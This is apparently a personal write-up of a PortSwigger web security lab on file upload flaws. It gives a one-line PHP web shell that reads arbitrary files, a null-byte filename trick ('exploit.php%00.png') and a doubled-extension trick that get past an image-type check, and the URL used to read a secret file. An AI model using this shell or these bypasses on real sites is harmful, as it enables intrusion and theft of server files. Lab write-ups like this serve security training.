https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

This lab contains a vulnerable image upload function.
upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret

1) write a exploit.php file that contains 
    <?php echo file_get_contents($_GET['filepath']); ?>

2) upload it as image,
    the website blocks it and says that only png and jpeg extensions are allowed

3) change the POST request to /my-account/avatar filename to
    filename="exploit.php%00.png"

    %00 is not considered because it is a null byte so the file is uploaded as exploit.php

    it works also as 
    
    filename="exploit.p.phphp"

4) visit /files/avatars/exploit.php?filepath=/home/carlos/secret


